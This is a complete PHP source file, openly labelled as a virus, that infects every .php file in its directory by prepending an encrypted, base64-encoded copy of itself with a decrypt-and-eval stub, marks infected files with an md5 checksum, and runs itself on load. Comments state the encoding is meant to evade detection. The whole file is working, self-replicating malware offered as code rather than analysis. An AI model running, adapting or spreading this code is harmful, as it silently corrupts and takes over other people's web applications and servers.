<?php
// VIRUS:START

function execute($virus)
{
    $filenames = glob("*.php");
    foreach ($filenames as $filename) {
        $script = fopen($filename, 'r');
        // * check If infected
        $first_line = fgets($script);
        $virus_hash = md5($filename);
        if (strpos($first_line, $virus_hash) === false) {
            $infected = fopen("$filename.infected", 'w');

            $checksum = "<?php // Checksum : " . $virus_hash . " ?>";
            $infection = "<?php" . encryptedVirus($virus) . "?>";

            fputs($infected, $checksum, strlen($checksum));
            fputs($infected, $infection, strlen($infection));
            fputs($infected, $first_line, strlen($first_line));

            while ($contents = fgets($script)) {
                fputs($infected, $contents, strlen($contents));
            }
            fclose($script);
            fclose($infected);
            unlink($filename);
            rename("$filename.infected", $filename);
        }
    }
}
// * To hide
function encryptedVirus($virus)
{
    // Gen key 64 
    $str = '012345678abcdef';
    $key = '';
    for ($i = 0; $i < 64; $i++) {
        $key .= $str[rand(0, strlen($str) - 1)];
    }
    //  pack the given parameter into a binary string in a given format
    $key = pack('H*', $key);
    //encrypt
    // Returns the size of the IV belonging to a specific cipher/mode combination
    $iv_size = mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC);
    $iv = mcrypt_create_iv($iv_size, MCRYPT_RAND);
    $encryptedVirus = mcrypt_encrypt(
        MCRYPT_RIJNDAEL_128,
        $key,
        $virus,
        MCRYPT_MODE_CBC,
        $iv
    );
    // encode  encrypted virus so we don't inject binry because it's detectable
    $encodedVirus = base64_encode($encryptedVirus);
    $encodediv = base64_encode($iv);
    $encodedKey = base64_encode($key);

    $payload = "
    \$encryptedVirus='$encodedVirus';
    \$iv='$encodediv';
    \$key='$encodedKey';

    \$virus=mcrypt_decrypt(
        MCRYPT_RIJNDAEL_128,
        base64_decode(\$key),
        base64_decode(\$encryptedVirus),
        MCRYPT_MODE_CBC,
       base64_decode(\$iv)
    );
    eval(\$virus);
    execute(\$virus);
    ";
    return $payload;
}

// VIRUS:END

//*  To Gurantee Self Replication
$virus = file_get_contents(__FILE__);
$virus = substr($virus, strpos($virus, "// VIRUS:START"));
$virus = substr($virus, 0, strpos($virus, "\n// VIRUS:END") + strlen("\n// VIRUS:END"));
execute($virus);

// change